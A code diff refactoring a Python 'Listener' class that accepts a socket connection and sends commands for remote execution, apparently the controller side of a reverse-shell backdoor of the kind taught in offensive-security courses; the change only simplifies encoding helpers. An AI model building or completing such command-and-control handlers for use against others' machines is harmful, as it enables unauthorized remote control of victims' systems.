@@ -12,7 +12,7 @@ class Listener:
         self.port = port
         self.host_name = socket.gethostname()
 
-        listener.bind(("localhost", self.port))
+        listener.bind(("127.0.0.1", self.port))
         listener.listen(4)
 
         server_about = {
@@ -25,30 +25,12 @@ class Listener:
             print(f"{key} <-> {server_about[key]}")
 
         print("\n[+] Waiting for incoming connection")
-        self.connection, self.address = listener.accept()
-        print(f"[+] Got a connection -> from :: {str(self.address)}")
-
-    def dataDecode(self, data) -> bytes:
-
-        if type(data) is bytes:
-            decode_data = data.decode("utf-8")
-            return decode_data
-
-        else:
-            return data
-
-    def dataEncode(self, data):
-
-        if type(data) is not bytes:
-            encode_data = data.encode("utf-8")
-            return encode_data
-
-        else:
-            return data
+        self.connection, address = listener.accept()
+        print(f"[+] Got a connection -> from :: {str(address)}")
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        json_data = self.dataEncode(json_data)
+        json_data = json_data.encode("utf-8")
         self.connection.send(json_data)
         print(f"[+] rel send -> {data}")
 
@@ -56,20 +38,18 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = self.dataDecode(json_data + self.connection.recv(1024))
+                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                 return json.loads(json_data)
                 print(f"[+] rcv -> {json.loads(json_data)}")
-
             except ValueError:
                 continue
 
     def execute_remotely(self, command):
         try:
             self.reliable_send(command)
-            result = self.dataEncode(self.reliable_receive())
-            result = self.dataDecode(result)
+            result = self.reliable_receive().encode("utf-8")
+            result = result.decode("utf-8")
             return result
-
         except AttributeError:
             return "[-] AttributeError"
 
